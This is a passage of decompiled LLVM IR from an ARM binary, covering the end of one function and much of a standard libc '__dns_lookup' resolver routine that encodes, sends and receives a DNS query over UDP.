  store i8 %v0_18a08.off0, i8* %v5_18a08, align 1
  %v0_18960.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_18964.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_18964.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_18a10:                               ; preds = %dec_label_pc_18960.dec_label_pc_1896c_crit_edge
  %v0_18a18.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_18a10, label %dec_label_pc_18a24, label %bb49

bb49:                                             ; preds = %dec_label_pc_1896c.preheader, %dec_label_pc_18a10
  %v0_18a18.pre69 = phi i32 [ %v0_18a18.pre.pre, %dec_label_pc_18a10 ], [ 0, %dec_label_pc_1896c.preheader ]
  %v2_18a14 = add i32 %v0_18a18.pre69, 1
  store i32 %v2_18a14, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_189cc, %dec_label_pc_189b8, %dec_label_pc_18990, %dec_label_pc_18960, %dec_label_pc_18a10, %dec_label_pc_18964.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_18a14, %bb49 ], [ -1, %dec_label_pc_18964.preheader ], [ %v0_18a18.pre.pre, %dec_label_pc_18a10 ], [ -1, %dec_label_pc_189b8 ], [ -1, %dec_label_pc_189cc ], [ -1, %dec_label_pc_18960 ], [ -1, %dec_label_pc_18990 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_18938, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_18a18.pre.pre, { 1, 0 }
  uselistorder i32 %v1_189f0, { 1, 0 }
  uselistorder i32 %v5_189a8, { 1, 0 }
  uselistorder i32 %v1_18988, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_189ac60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1896c63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_18a1066, { 1, 2, 0 }
  uselistorder i32 %v0_1893c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_18a24, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_18978, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_18a30 = load i32, i32* @r4, align 4
  %v6_18a30 = load i32, i32* @r5, align 4
  %v9_18a30 = load i32, i32* @r6, align 4
  %v12_18a30 = load i32, i32* @r7, align 4
  %v15_18a30 = load i32, i32* @r8, align 4
  %v18_18a30 = load i32, i32* @sb, align 4
  %v21_18a30 = load i32, i32* @sl, align 4
  %v24_18a30 = load i32, i32* @fp, align 4
  %v27_18a30 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_18a44 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a4c = call i32 @malloc(i32 512)
  store i32 %v1_18a4c, i32* @sl, align 4
  %v0_18a54 = load i32, i32* @r4, align 4
  %v1_18a54 = inttoptr i32 %v0_18a54 to i8*
  %v3_18a58 = call i32 @strlen(i8* %v1_18a54)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_18a64 = icmp ugt i32 %v3_18a58, 893
  store i1 %v3_18a64, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_18a58, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_18a84

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19194

dec_label_pc_18a84:                               ; preds = %entry
  %v1_18a88 = add i32 %v3_18a58, 130
  %v1_18a8c = call i32 @malloc(i32 %v1_18a88)
  store i32 %v1_18a8c, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a90 = icmp eq i32 %v1_18a8c, 0
  br i1 %v2_18a90, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_18a84
  %v1_18a94 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_18a94 = icmp eq i32 %v1_18a94, 0
  br i1 %v3_18a94, label %bb213, label %dec_label_pc_18aa8

.thread5:                                         ; preds = %dec_label_pc_18a84
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1918c

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1918c

dec_label_pc_18aa8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_18aa8 = load i32, i32* @r4, align 4
  %v1_18aa8 = inttoptr i32 %v0_18aa8 to i8*
  %v2_18aa8 = load i8, i8* %v1_18aa8, align 1
  %v3_18aa8 = zext i8 %v2_18aa8 to i32
  store i32 %v3_18aa8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18aac = icmp eq i8 %v2_18aa8, 0
  br i1 %v2_18aac, label %dec_label_pc_1918c, label %dec_label_pc_18ab4

dec_label_pc_18ab4:                               ; preds = %dec_label_pc_18aa8
  %v2_18ab8 = add i32 %v0_18aa8, %v3_18a58
  store i32 %v2_18ab8, i32* %r3.global-to-local, align 4
  %v1_18abc = add i32 %v2_18ab8, -1
  %v2_18abc = inttoptr i32 %v1_18abc to i8*
  %v3_18abc = load i8, i8* %v2_18abc, align 1
  %v4_18abc = zext i8 %v3_18abc to i32
  store i32 %v4_18abc, i32* @r3, align 4
  store i32 %v3_18a58, i32* @r2, align 4
  store i32 %v0_18aa8, i32* @r1, align 4
  %v0_18acc = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 28652, i32* %ip.global-to-local, align 4
  store i32 27616, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_18b48 = ptrtoint i32* %stack_var_-76 to i32
  %v2_18c60 = ptrtoint i16* %stack_var_-104 to i32
  %v15_18c64 = ptrtoint i32* %stack_var_-88 to i32
  %v2_18c88 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18ca8 = bitcast i32* %stack_var_-192 to i8*
  %v2_18d5c = ptrtoint i32* %stack_var_-48 to i32
  %v2_18d68 = ptrtoint i32* %stack_var_-56 to i32
  %v2_18df4 = icmp eq i32 %tmp161, 0
  %v1_18e00 = add i32 %tmp160, -2
  %v2_18e04 = icmp ne i32 %v1_18e00, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_18ef0 = ptrtoint i32* %stack_var_-448 to i32
  %v2_18ef4 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1913856 = icmp sgt i32 %tmp159, 0
  %v2_19060 = icmp ne i32 %v0_18a44, 0
  %v7_19060 = icmp eq i32 %v0_18a44, 1
  %v1_18f54 = bitcast i32* %stack_var_-448 to i8*
  %v2_19008 = icmp eq i32 %tmp144, 0
  %v2_18e10 = icmp ugt i8 %v3_18abc, 45
  %v7_18e10 = icmp eq i8 %v3_18abc, 46
  %v1_18bbc = add i32 %v1_18a8c, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_18b9c = add i32 %v1_18a8c, %v3_18a58
  %v5_18b9c = inttoptr i32 %v4_18b9c to i8*
  %v1_18e00.cmp = icmp ugt i32 %v1_18e00, 1
  %v2_18e38 = icmp eq i32 %tmp160, 0
  %v3_19064 = icmp ugt i32 %v0_18a44, 27
  %v8_19064 = icmp eq i32 %v0_18a44, 28
  br label %dec_label_pc_18b2c

dec_label_pc_18b2c:                               ; preds = %dec_label_pc_19174, %dec_label_pc_18ab4
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_18ab4 ], [ %v1_19178, %dec_label_pc_19174 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_18ab4 ], [ %v3_18c40, %dec_label_pc_19174 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_18ab4 ], [ %stack_var_-468.2, %dec_label_pc_19174 ]
  %v1_18b34 = phi i32 [ -1, %dec_label_pc_18ab4 ], [ %v3_18d14, %dec_label_pc_19174 ]
  store i32 %v1_18b34, i32* %r3.global-to-local, align 4
  %v2_18b30 = icmp eq i32 %v1_18b34, -1
  store i1 %v2_18b30, i1* %cpsr_c.global-to-local, align 1
  %v7_18b30 = icmp eq i32 %v1_18b34, -1
  br i1 %v7_18b30, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_18b2c
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_18b2c, %bb215
  %v1_18b38 = xor i1 %v7_18b30, true
  call void @__pseudo_cond_branch(i1 %v1_18b38, i32 ptrtoint (i32* @global_var_fb64.940 to i32))
  store i32 36, i32* @r7, align 4
  %v0_18b44 = load i32, i32* @r8, align 4
  %v2_18b44 = add i32 %v0_18b44, 40
  %v3_18b44 = inttoptr i32 %v2_18b44 to i32*
  %v4_18b44 = load i32, i32* %v3_18b44, align 4
  store i32 %v4_18b44, i32* @r4, align 4
  store i32 %v2_18b48, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_18b54 = add i32 %v0_18b44, 36
  %v3_18b54 = inttoptr i32 %v2_18b54 to i32*
  %v4_18b54 = load i32, i32* %v3_18b54, align 4
  store i32 %v4_18b54, i32* %r1.global-to-local, align 4
  %v2_18b5c = add i32 %v0_18b44, 76
  %v3_18b5c = inttoptr i32 %v2_18b5c to i32*
  %v4_18b5c = load i32, i32* %v3_18b5c, align 4
  store i32 %v4_18b5c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18b5c)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_18b70 = load i32, i32* @r8, align 4
  %v2_18b70 = add i32 %v0_18b70, 16
  %v3_18b70 = inttoptr i32 %v2_18b70 to i32*
  %v4_18b70 = load i32, i32* %v3_18b70, align 4
  store i32 %v4_18b70, i32* %ip.global-to-local, align 4
  store i32 101244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18b70)
  %v0_18b7c = call i32 @__open_nameservers()
  %v0_18b84 = load i32, i32* @r8, align 4
  %v2_18b84 = add i32 %v0_18b84, 28664
  %v3_18b84 = inttoptr i32 %v2_18b84 to i32*
  %v4_18b84 = load i32, i32* %v3_18b84, align 4
  store i32 %v1_18a8c, i32* %r3.global-to-local, align 4
  store i32 %v3_18a58, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_18b94 = load i32, i32* @sb, align 4
  %v3_18b94 = icmp uge i32 %v0_18b94, %v4_18b84
  store i1 %v3_18b94, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_18b9c, align 1
  %v0_18ba0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18ba0, label %dec_label_pc_18bcc, label %dec_label_pc_18ba4

dec_label_pc_18ba4:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_18bac = load i32, i32* %ip.global-to-local, align 4
  %v4_18bac = add i32 %v3_18bac, %v1_18a8c
  %v5_18bac = inttoptr i32 %v4_18bac to i8*
  store i8 46, i8* %v5_18bac, align 1
  store i32 28652, i32* %r1.global-to-local, align 4
  %v0_18bb8 = load i32, i32* @r8, align 4
  %v2_18bb8 = add i32 %v0_18bb8, 28652
  %v3_18bb8 = inttoptr i32 %v2_18bb8 to i32*
  %v4_18bb8 = load i32, i32* %v3_18bb8, align 4
  store i32 %v4_18bb8, i32* %r3.global-to-local, align 4
  %v1_18bc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_18bc0 = add i32 %v1_18bbc, %v1_18bc0
  %v1_18bc4 = load i32, i32* @sb, align 4
  %v2_18bc4 = and i32 %v1_18bc4, 1073741824
  %v3_18bc4 = icmp ne i32 %v2_18bc4, 0
  store i1 %v3_18bc4, i1* %cpsr_c.global-to-local, align 1
  %v4_18bc4 = mul i32 %v1_18bc4, 4
  %v5_18bc4 = add i32 %v4_18bc4, %v4_18bb8
  %v6_18bc4 = inttoptr i32 %v5_18bc4 to i32*
  %v7_18bc4 = load i32, i32* %v6_18bc4, align 4
  store i32 %v7_18bc4, i32* @r1, align 4
  %v2_18bc8 = inttoptr i32 %v2_18bc0 to i8*
  %v3_18bc8 = call i32 @strcpy(i8* %v2_18bc8, i32 %v7_18bc4)
  br label %dec_label_pc_18bcc

dec_label_pc_18bcc:                               ; preds = %bb216, %dec_label_pc_18ba4
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18bd0 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_18bd0, label %dec_label_pc_18bd8, label %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge

dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge:  ; preds = %dec_label_pc_18bcc
  %v0_18c10.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_18c08

dec_label_pc_18bd8:                               ; preds = %dec_label_pc_18bcc
  store i32 28660, i32* %r3.global-to-local, align 4
  store i32 2423, i32* %ip.global-to-local, align 4
  %v0_18be0 = load i32, i32* @r8, align 4
  %v2_18be0 = add i32 %v0_18be0, 28660
  %v3_18be0 = inttoptr i32 %v2_18be0 to i32*
  %v4_18be0 = load i32, i32* %v3_18be0, align 4
  %v2_18be4 = add i32 %v0_18be0, 2423
  %v3_18be4 = inttoptr i32 %v2_18be4 to i8*
  %v4_18be4 = load i8, i8* %v3_18be4, align 1
  %v6_18be4 = zext i8 %v4_18be4 to i32
  %v2_18be8 = mul i32 %v6_18be4, %v4_18be0
  store i32 %v2_18be8, i32* %r3.global-to-local, align 4
  store i32 27616, i32* %r1.global-to-local, align 4
  %v2_18bf4 = add i32 %v0_18be0, 2420
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i16*
  %v4_18bf4 = load i16, i16* %v3_18bf4, align 2
  %v6_18bf4 = zext i16 %v4_18bf4 to i32
  %v2_18bf8 = add i32 %v0_18be0, 27616
  %v3_18bf8 = inttoptr i32 %v2_18bf8 to i32*
  %v4_18bf8 = load i32, i32* %v3_18bf8, align 4
  store i32 %v4_18bf8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18c08

dec_label_pc_18c08:                               ; preds = %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge, %dec_label_pc_18bd8
  %v2_18c4c = phi i32 [ %v0_18be0, %dec_label_pc_18bd8 ], [ %v0_18c10.pre, %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_18bf4, %dec_label_pc_18bd8 ], [ %stack_var_-464.0, %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_18bf8, %dec_label_pc_18bd8 ], [ %stack_var_-468.0, %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_18be8, %dec_label_pc_18bd8 ], [ %stack_var_-476.0, %dec_label_pc_18bcc.dec_label_pc_18c08_crit_edge ]
  store i32 28660, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_18c10 = add i32 %v2_18c4c, 28660
  %v3_18c10 = inttoptr i32 %v2_18c10 to i32*
  %v4_18c10 = load i32, i32* %v3_18c10, align 4
  store i32 28656, i32* %r3.global-to-local, align 4
  %v3_18c18 = icmp uge i32 %stack_var_-468.1, %v4_18c10
  store i1 %v3_18c18, i1* %cpsr_c.global-to-local, align 1
  %v2_18c1c = add i32 %v2_18c4c, 28656
  %v3_18c1c = inttoptr i32 %v2_18c1c to i32*
  %v4_18c1c = load i32, i32* %v3_18c1c, align 4
  store i32 %v4_18c1c, i32* %r3.global-to-local, align 4
  br i1 %v3_18c18, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_18c08
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_18c08, %bb217
  %v0_18c28 = phi i32 [ %stack_var_-468.1, %dec_label_pc_18c08 ], [ 0, %bb217 ]
  %v3_18c28 = mul i32 %v0_18c28, 28
  %v4_18c28 = add i32 %v3_18c28, %v4_18c1c
  store i32 %v4_18c28, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_18c34 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_18c40 = urem i32 %v1_18c34, 65536
  store i32 27616, i32* %r1.global-to-local, align 4
  %v1_18c4c = trunc i32 %v1_18c34 to i16
  %v4_18c4c = add i32 %v2_18c4c, 2420
  %v5_18c4c = inttoptr i32 %v4_18c4c to i16*
  store i16 %v1_18c4c, i16* %v5_18c4c, align 2
  %v1_18c54 = load i32, i32* @r8, align 4
  %v2_18c54 = load i32, i32* %r1.global-to-local, align 4
  %v3_18c54 = add i32 %v2_18c54, %v1_18c54
  %v4_18c54 = inttoptr i32 %v3_18c54 to i32*
  store i32 %v0_18c28, i32* %v4_18c54, align 4
  %v0_18c58 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c5c = inttoptr i32 %v0_18c58 to i32*
  %v2_18c5c = load i32, i32* %v1_18c5c, align 4
  %v3_18c5c = add i32 %v0_18c58, 4
  %v4_18c5c = inttoptr i32 %v3_18c5c to i32*
  %v5_18c5c = load i32, i32* %v4_18c5c, align 4
  store i32 %v5_18c5c, i32* %r1.global-to-local, align 4
  %v9_18c5c = add i32 %v0_18c58, 12
  %v10_18c5c = inttoptr i32 %v9_18c5c to i32*
  %v11_18c5c = load i32, i32* %v10_18c5c, align 4
  store i32 %v11_18c5c, i32* %r3.global-to-local, align 4
  %v12_18c5c = add i32 %v0_18c58, 16
  %v4_18c64 = trunc i32 %v2_18c5c to i16
  store i16 %v4_18c64, i16* %stack_var_-104, align 2
  store i32 %v15_18c64, i32* %ip.global-to-local, align 4
  %v1_18c68 = inttoptr i32 %v12_18c5c to i32*
  %v2_18c68 = load i32, i32* %v1_18c68, align 4
  %v3_18c68 = add i32 %v0_18c58, 20
  %v4_18c68 = inttoptr i32 %v3_18c68 to i32*
  %v5_18c68 = load i32, i32* %v4_18c68, align 4
  store i32 %v5_18c68, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_18c68, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_18c7c = load i32, i32* @r8, align 4
  %v2_18c7c = add i32 %v0_18c7c, 24
  %v3_18c7c = inttoptr i32 %v2_18c7c to i32*
  %v4_18c7c = load i32, i32* %v3_18c7c, align 4
  store i32 %v4_18c7c, i32* %ip.global-to-local, align 4
  store i32 101512, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18c7c)
  store i32 %v2_18c88, i32* @r6, align 4
  %v0_18c8c = load i32, i32* @r7, align 4
  store i32 %v0_18c8c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_18c94 = load i32, i32* @sl, align 4
  %v2_18c98 = inttoptr i32 %v0_18c94 to i8*
  %v3_18c98 = call i32 @__GI_memset(i8* %v2_18c98, i32 %v0_18c8c)
  %v0_18c9c = load i32, i32* @r7, align 4
  store i32 %v0_18c9c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_18ca8 = call i32 @__GI_memset(i8* %v2_18ca8, i32 %v0_18c9c)
  store i32 %v3_18c40, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_18cb8 = load i32, i32* @sl, align 4
  store i32 %v0_18cb8, i32* %r1.global-to-local, align 4
  store i32 %v3_18c40, i32* %stack_var_-192, align 4
  %v6_18ccc = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_18cb8, i32 512, i32 %v3_18c40, i32 %v3_18c40)
  store i32 %v6_18ccc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18cd0 = icmp slt i32 %v6_18ccc, 0
  br i1 %v1_18cd0, label %dec_label_pc_1918c, label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %bb218
  store i32 %v0_18a44, i32* @ip, align 4
  store i32 %v1_18a8c, i32* @r5, align 4
  %v0_18ce8 = load i32, i32* @sl, align 4
  %v2_18ce8 = add i32 %v0_18ce8, %v6_18ccc
  store i32 %v2_18ce8, i32* %r1.global-to-local, align 4
  %v1_18cec = sub i32 512, %v6_18ccc
  store i32 %v1_18a8c, i32* %stack_var_-60, align 4
  store i32 %v0_18a44, i32* %stack_var_-56, align 4
  %v4_18cf8 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_18ce8, i32 %v1_18cec)
  store i32 %v4_18cf8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18cfc = icmp slt i32 %v4_18cf8, 0
  br i1 %v1_18cfc, label %dec_label_pc_1918c, label %dec_label_pc_18d04

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18cd8
  %v3_18d08 = load i16, i16* %stack_var_-104, align 2
  %v4_18d08 = sext i16 %v3_18d08 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_18d14 = call i32 @socket(i32 %v4_18d08, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18d18 = icmp slt i32 %v3_18d14, 0
  br i1 %v1_18d18, label %dec_label_pc_19164, label %dec_label_pc_18d24

dec_label_pc_18d24:                               ; preds = %dec_label_pc_18d04
  store i32 %v2_18c60, i32* %r1.global-to-local, align 4
  %v3_18d2c = call i32 @__libc_connect(i32 %v3_18d14, i32 %v2_18c60, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18d30 = icmp slt i32 %v3_18d2c, 0
  br i1 %v1_18d30, label %dec_label_pc_19164, label %dec_label_pc_18d38

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d24
  %v0_18d38 = load i32, i32* @r5, align 4
  %v1_18d38 = load i32, i32* @r4, align 4
  %v2_18d38 = add i32 %v1_18d38, %v0_18d38
  %v0_18d3c = load i32, i32* @r7, align 4
  store i32 %v0_18d3c, i32* %r3.global-to-local, align 4
  %v0_18d44 = load i32, i32* @sl, align 4
  store i32 %v0_18d44, i32* %r1.global-to-local, align 4
  %v4_18d48 = call i32 @__libc_send(i32 %v3_18d14, i32 %v0_18d44, i32 %v2_18d38, i32 %v0_18d3c)
  store i32 2422, i32* %r3.global-to-local, align 4
  %v0_18d50 = load i32, i32* @r8, align 4
  %v2_18d50 = add i32 %v0_18d50, 2422
  %v3_18d50 = inttoptr i32 %v2_18d50 to i8*
  %v4_18d50 = load i8, i8* %v3_18d50, align 1
  %v6_18d50 = zext i8 %v4_18d50 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_18d58 = mul nuw nsw i32 %v6_18d50, 1000
  store i32 %v2_18d58, i32* @r4, align 4
  store i32 %v2_18d5c, i32* @r5, align 4
  br label %dec_label_pc_18d60

dec_label_pc_18d60:                               ; preds = %thread-pre-split, %dec_label_pc_18d38
  %v0_18d6c = phi i32 [ %v1_18dac, %thread-pre-split ], [ %v2_18d58, %dec_label_pc_18d38 ]
  store i32 %v3_18d14, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_18d68, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_18d14, i32* %stack_var_-48, align 4
  %v7_18d80 = call i32 @__GI_poll(i32 %v2_18d5c, i32 1, i32 %v0_18d6c, i32 %v3_18d14, i32 %v3_18d14, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_18d88 = load i32, i32* @sl, align 4
  store i32 %v0_18d88, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_18d80, 1
  br i1 %tmp219, label %dec_label_pc_19164, label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %dec_label_pc_18d60
  %v5_18d9c = call i32 @__libc_recv(i32 %v3_18d14, i32 %v0_18d88, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_18da0 = icmp ugt i32 %v5_18d9c, 10
  store i1 %v2_18da0, i1* %cpsr_c.global-to-local, align 1
  %v8_18da8 = icmp sgt i32 %v5_18d9c, 11
  br i1 %v8_18da8, label %dec_label_pc_18dd4, label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %dec_label_pc_18dd4, %dec_label_pc_18df0, %dec_label_pc_18d9c
  %v0_18dac = load i32, i32* @r4, align 4
  %v1_18dac = add i32 %v0_18dac, -1000
  store i32 %v1_18dac, i32* @r4, align 4
  %v7_18dac = icmp eq i32 %v0_18dac, 1000
  %tmp283 = zext i1 %v7_18dac to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18dbc = icmp slt i32 %v5_18d9c, 0
  br i1 %v1_18dbc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_18dac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_19164

thread-pre-split:                                 ; preds = %dec_label_pc_18dac
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18dac, label %dec_label_pc_19164, label %dec_label_pc_18d60

dec_label_pc_18dd4:                               ; preds = %dec_label_pc_18d9c
  store i32 %v2_18c88, i32* %r1.global-to-local, align 4
  %v0_18dd8 = load i32, i32* @sl, align 4
  %v2_18ddc = inttoptr i32 %v0_18dd8 to i8*
  %v3_18ddc = call i32 @__decode_header(i8* %v2_18ddc, i32 %v2_18c88)
  %v3_18de0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_18de0, i32* %r3.global-to-local, align 4
  store i32 %v3_18c40, i32* %r1.global-to-local, align 4
  %v3_18de8 = icmp uge i32 %v3_18de0, %v3_18c40
  store i1 %v3_18de8, i1* %cpsr_c.global-to-local, align 1
  %v9_18de8 = icmp eq i32 %v3_18de0, %v3_18c40
  br i1 %v9_18de8, label %dec_label_pc_18df0, label %dec_label_pc_18dac

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18dd4
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18df4, label %dec_label_pc_18dac, label %dec_label_pc_18dfc

dec_label_pc_18dfc:                               ; preds = %dec_label_pc_18df0
  store i32 %v1_18e00, i32* %r3.global-to-local, align 4
  store i1 %v2_18e04, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_18e00.cmp, label %dec_label_pc_18e38, label %dec_label_pc_18e0c

dec_label_pc_18e0c:                               ; preds = %dec_label_pc_18dfc
  store i1 %v2_18e10, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18e10, label %dec_label_pc_18e2c, label %dec_label_pc_18e18

dec_label_pc_18e18:                               ; preds = %dec_label_pc_18e0c
  store i32 %v4_18b84, i32* @r5, align 4
  %v1_18e1c = add i32 %v4_18b84, -1
  store i32 %v1_18e1c, i32* %r3.global-to-local, align 4
  %v0_18e20 = load i32, i32* @sb, align 4
  %v3_18e20 = icmp uge i32 %v0_18e20, %v1_18e1c
  store i1 %v3_18e20, i1* %cpsr_c.global-to-local, align 1
  %v5_18e24 = icmp slt i32 %v0_18e20, %v1_18e1c
  br i1 %v5_18e24, label %.thread7, label %dec_label_pc_18e2c

.thread7:                                         ; preds = %dec_label_pc_18e18
  %v7_18e24 = add i32 %v0_18e20, 1
  br label %dec_label_pc_19174

dec_label_pc_18e2c:                               ; preds = %dec_label_pc_18e18, %dec_label_pc_18e0c
  %v0_18e2c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18e60

